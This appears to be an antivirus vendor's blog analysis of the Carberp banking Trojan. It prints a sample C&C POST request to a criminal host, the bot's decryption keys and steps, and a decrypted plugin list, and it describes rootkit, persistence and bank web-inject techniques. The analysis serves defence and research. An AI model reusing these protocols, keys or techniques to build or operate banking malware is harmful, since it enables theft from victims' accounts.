                                <div class="box"><p class="perex">Banking Trojan Carberp: An Epitaph?</p>


                                    <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The begining of spring seems to be an unsuccessful period of the year for cybercriminals in Eastern Europe. There is recent news referring to <a href="http://www.kommersant.ua/doc/2160535"> a neutralization of a group of hackers</a> by joint cooperation between the Security Service of Ukraine with the Federal Security Service of the Russian Federation (FSB) on the web. These hackers are responsible for the infamous Trojan called Carberp.</p>
<p>Due to this recent information, we are allowed to say that Carberp <strong>was </strong>as a mainstream Trojan that monitored the environment of infected computers and exploited remote banking systems. It was a robust modular malware that improved its capabilities by drive-by-downloaded dynamic libraries – plugins. It was not only successfully grabbing money from victim's bank accounts but also the attention of security experts both in an industrial and an academic sphere (an example of <a href="http://staff.science.uva.nl/~delaat/rp/2012-2013/p42/report.pdf">a paper</a>). Therefore there are plenty of references on the web considering the methods of a system invasion, protection by polymorphic outer layers and a persistence of the Trojan. We will try to fill in some gaps in the picture.</p>
<p>Carberp started its progress approximately in autumn 2010. Later in spring 2011 it was split into two main branches regarding the form of HTTP requests.  <!--more-->The first one used the RC4 cipher to encrypt data exchanged with C&amp;C and it posted requests in the form:</p>
<table border="1" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td valign="top" width="614">http://&lt;top level domain&gt;/e/&lt;8-11 random alphanumeric characters&gt;</td>
</tr>
</tbody>
</table>
<p>This one faded away along with <a href="http://news.techworld.com/security/3345695/russian-police-arrest-notorious-carberp-trojan-gang">the arrest of cybercriminals</a> in March 2012. The second one was based on RC2 cipher and it generated hits with avast! shields in the wild during the last weeks. Let's see how it talked with C&amp;C.</p>
<p><strong>Communication protocol</strong></p>
<p>A typical HTTP post looked like</p>
<table border="1" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td valign="top" width="614">POST /kmqkcicalxrntrngwdxjyxztxcqkoyjnbdoafqirgnwwvpcjqglucovna.phtm HTTP/1.1<br>
Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)<br>
Host: caaarrp2.ru<br>
Connection: close<br>
Content-Type: application/x-www-form-urlencoded<br>
Content-Length: 60</td>
</tr>
</tbody>
</table>
<p>with a content of the form like this:</p>
<table border="1" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td valign="top" width="614">kfq=u%2FFPG1eImmXBEb3mG5VomEqE9ivVw2uh550qE1K2LoqWfJkbTeN%3D</td>
</tr>
</tbody>
</table>
<p>where ‘kfq’ is a randomly generated string which is concatenated with the equality sign and an encoded message. Unsafe characters in the encoded message are escaped with the percent sign. Let's write this particular example after decoding:</p>
<table border="1" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td valign="top" width="614">kfq=u/FPG1eImmXBEb3mG5VomEqE9ivVw2uh550qE1K2LoqWfJkbTeN=</td>
</tr>
</tbody>
</table>
<p>and let's extract the first 4 symbols after the first equality symbol concatenated with the last 4 symbols (ignoring the tailing equality symbol ) as a string. It is used as <a href="http://en.wikipedia.org/wiki/Salt_(cryptography)">a cryptographic salt</a> for RC2 decryption and denote it <i>szSalt</i>, i.e. szSalt = ‘u/FPbTeN’. Then the proper encrypted message equals (denote it szEncMsg):</p>
<table border="1" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td valign="top" width="614">G1eImmXBEb3mG5VomEqE9ivVw2uh550qE1K2LoqWfJ</td>
</tr>
</tbody>
</table>
<p>After the decryption on the server-side it would be read like ‘botuid=wtfuck0780E8ABE9244C0B4’ where ‘wtfuck’ is a constant encrypted in Trojan’s body and ‘780E8ABE9244C0B4’ is a particular hash of victim’s environment. Every sample of Carberp contained another constant - a key, denote it <i>szKey</i>, e.g. szKey = ‘mt19YrKTaSH3kCVA’.</p>
<p>Decryption of the content is performed in the following steps:</p>
<p>Step 1)  Extraction of the proper encrypted message and the variable szSalt. Transformation of ‘+’ to ‘&gt;’ and ‘/’ to ‘?’.</p>
<p>Step 2)  Decoding of  <em>szEncMsg </em>to a buffer <em>au8EncMsg_Debase64 </em></p>
<p>Step 3)  Decrypting of the buffer <em>au8EncMsg_Debase64 </em>to a buffer <em>au8EncMsg_Debase64_DeRC2 </em>using RC2 with the salt  <em>szSalt </em>and the key <em>szKey</em></p>
<p>If the downloaded content is an encrypted executable or a configuration file then there is another step:</p>
<p>Step 4)  Decrypting the buffer <em>au8EncMsg_Debase64_DeRC2  </em>using a custom algorithm <em>decryptBJB</em>(..)  that has already appeared in early stages of Carberp. A magic string "BJB" is in the header and it is followed by a key length, a key string and a main ciphered data.</p>
<p><a href="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp_decbjb.png"><img alt="carberp_decBJB" class="alignnone size-full wp-image-13305" height="353" src="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp_decbjb.png?width=600&amp;height=353&amp;name=carberp_decbjb.png" width="600" srcset="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp_decbjb.png?width=300&amp;height=177&amp;name=carberp_decbjb.png 300w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp_decbjb.png?width=600&amp;height=353&amp;name=carberp_decbjb.png 600w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp_decbjb.png?width=900&amp;height=530&amp;name=carberp_decbjb.png 900w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp_decbjb.png?width=1200&amp;height=706&amp;name=carberp_decbjb.png 1200w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp_decbjb.png?width=1500&amp;height=883&amp;name=carberp_decbjb.png 1500w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp_decbjb.png?width=1800&amp;height=1059&amp;name=carberp_decbjb.png 1800w" sizes="(max-width: 600px) 100vw, 600px"></a></p>
<p><span style="font-size: 13px"> </span></p>
<p>One of the early requests going to C&amp;C is the wish for available plugins. After a successful connection a list of plugins is saved in "%AppData\&lt;hash sequence&gt;\wndsksi.inf" in an encrypted form. Ignoring the first 20 bytes and using the mentioned <em>decryptBJB</em> algorithm with the key "GDlet64E" one could get something similar to:</p>
<table border="1" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td valign="top" width="614">ammy.plug|Y05jP1GNybVxZ3Wv6sMQCwzmJ9rhH2Rg.tiff<br>
config.bin|KVZswznW95xFch3X.tiff<br>
ddos.plug|ZqRMXA6Cxsg1m3KbdfyF2ncYPWV78TpN.bmp<br>
ifobs.plug|8X2ZWnDfSsrpYtK1hdazxcq.bmp<br>
passw.plug|53DS2x0qgvmGzwtpyrahPQW9J8nNA.tiff<br>
rdp.plug|aDb6TYnKkc3Q7N.tiff<br>
rtlext.plug|jhJrdMWzK2XqpkYV91a6tQv7Z.psd<br>
sb.plug|8DhsH4PmpSFWrV7QwA5dtbv0KJN.tiff<br>
vnc.plug|JD6HPMCQjN8kgFYcR57pdtn1y2X0rm.psd</td>
</tr>
</tbody>
</table>
<p>This list shows only a subset of plugins available for the bot. The following diagram estimates the evolution of available plugins and the time when they appeared for the first time:</p>
<p><a href="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_history_plugins_graf_final.jpg"><img alt="Carberp Evolution of Plugins" class="alignnone size-full wp-image-13292" height="900" src="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_history_plugins_graf_final.jpg?width=600&amp;height=900&amp;name=carberp2_history_plugins_graf_final.jpg" width="600" srcset="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_history_plugins_graf_final.jpg?width=300&amp;height=450&amp;name=carberp2_history_plugins_graf_final.jpg 300w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_history_plugins_graf_final.jpg?width=600&amp;height=900&amp;name=carberp2_history_plugins_graf_final.jpg 600w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_history_plugins_graf_final.jpg?width=900&amp;height=1350&amp;name=carberp2_history_plugins_graf_final.jpg 900w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_history_plugins_graf_final.jpg?width=1200&amp;height=1800&amp;name=carberp2_history_plugins_graf_final.jpg 1200w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_history_plugins_graf_final.jpg?width=1500&amp;height=2250&amp;name=carberp2_history_plugins_graf_final.jpg 1500w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_history_plugins_graf_final.jpg?width=1800&amp;height=2700&amp;name=carberp2_history_plugins_graf_final.jpg 1800w" sizes="(max-width: 600px) 100vw, 600px"></a></p>
<p><strong>Detailed analysis of plugins</strong></p>
<p>Plugins from early stages of development are well known (<em>miniav.plug</em>, <em>stopav.plug</em>, <em>passw.plug</em>) and the yellow ones seemed to be obsolete in recent versions of the bot. File <em>ddos.plug</em> exports the only function called ‘StartHTTP’ and contains a list of various HTTP referrers and domain names. The name of plugin indicates it's potential in <a href="http://en.wikipedia.org/wiki/Denial-of-service_attack"> a distributed denial-of-service attack</a>.</p>
<p>The orange group contains <em>cyberplat.plug</em>,<em> sb.plug</em> (evolved from early <em>sbtest.plug</em> version) and <em>ifobs.plug</em> that try to exploit Cyberplat, iFOBS and Sberbank payment processing systems. Last month a download of a java archive called <em>AgentX.jar</em> together with an encrypted data file <em>rt.ini</em> ((two steps of decryption one of which is RC4 with the key "123%esr2#221@#" ) was implemented in the Carberp module. They are dropped into the application directory of an e-banking system called IBank.  The plain ini file could look like (observe that C&amp;C servers of the bot):</p>
<p><a href="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_rt_ini.png" style="font-size: 13px"><img alt="carberp2_rt_ini" class="alignnone size-full wp-image-13425" height="485" src="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_rt_ini.png?width=561&amp;height=485&amp;name=carberp2_rt_ini.png" width="561" srcset="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_rt_ini.png?width=281&amp;height=243&amp;name=carberp2_rt_ini.png 281w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_rt_ini.png?width=561&amp;height=485&amp;name=carberp2_rt_ini.png 561w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_rt_ini.png?width=842&amp;height=728&amp;name=carberp2_rt_ini.png 842w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_rt_ini.png?width=1122&amp;height=970&amp;name=carberp2_rt_ini.png 1122w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_rt_ini.png?width=1403&amp;height=1213&amp;name=carberp2_rt_ini.png 1403w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_rt_ini.png?width=1683&amp;height=1455&amp;name=carberp2_rt_ini.png 1683w" sizes="(max-width: 561px) 100vw, 561px"></a></p>
<p>&nbsp;</p>
<p>The archive is a successor of previously used archives patching a Java code on the fly called <em>Agent.jar</em>, <em>AgentPassive.jar</em> and <em>AgentKP.jar</em>. They all had a potential to fraudulently interact with a victim's payment processing. A text document <em>uid.txt </em>containing id of the running instance of the bot was created and declared a sign of infection.</p>
<p>The light blue group represents utilities enhancing remote spying activities of the Trojan. File <em>vnc.plug</em> is an executable that enables remote access to an infected computer via remote framebuffer protocol (RFB). Additionally, it contains an embedded library<em> inj_x86.dll</em> (<em>inj_x64.dll</em> respectively) which provides a user mode rootkit functionality that masks processes started remotely (on "secret_desktop") on victim's desktop:</p>

<p>The green group is all about the plugin <em>bot.plug </em>which has most of the functionality of the main Carberp module in the form of a dynamically linked library exporting three functions: <em>SetBotParameter</em>, <em>Start</em> and <em>SFFD </em>(the latter injects its own code into explorer as the main module does).  It is produced by a generator called <em>Bot builder</em>:</p>
<p><a href="//blog.avast.com/wp-content/uploads/2013/04/carberp2_bot_builder.png"><img alt="carberp2_bot_builder" height="381" src="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_bot_builder.png?width=600&amp;height=381&amp;name=carberp2_bot_builder.png" width="600" srcset="//cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_bot_builder.png?width=300&amp;height=191&amp;name=carberp2_bot_builder.png 300w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_bot_builder.png?width=600&amp;height=381&amp;name=carberp2_bot_builder.png 600w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_bot_builder.png?width=900&amp;height=572&amp;name=carberp2_bot_builder.png 900w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_bot_builder.png?width=1200&amp;height=762&amp;name=carberp2_bot_builder.png 1200w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_bot_builder.png?width=1500&amp;height=953&amp;name=carberp2_bot_builder.png 1500w, //cdn2.hubspot.net/hub/4650993/avast-blog/blog-files/carberp2_bot_builder.png?width=1800&amp;height=1143&amp;name=carberp2_bot_builder.png 1800w" sizes="(max-width: 600px) 100vw, 600px"></a></p>
<p>After a request of its download it is stored in an encrypted form in %AppData% directory for later use. It could be remotely reactivated by a command <em>installfakedll </em>from a C&amp;C server which leads to a drop of <em>fake.dll </em>into to the Internet Explorer program directory under various confusing names (e.g. sqmapi.dll, browsui.dll). A function of this library is the decryption of stored <em>bot.plug</em> followed by calls of bot's exports <em>Start</em> and <em>SFFD</em>.</p>
<p><span style="font-size: 13px">One of the f</span><span style="font-size: 13px">iles additionally requested is called <em>config.bin. </em>It is a set of JavaScript web injects performing an attack to various internet banking systems in Russia and Ukraine. Injects are triggered by particular masks in a web browser (example of a bank targeted is in the bracket):</span></p>
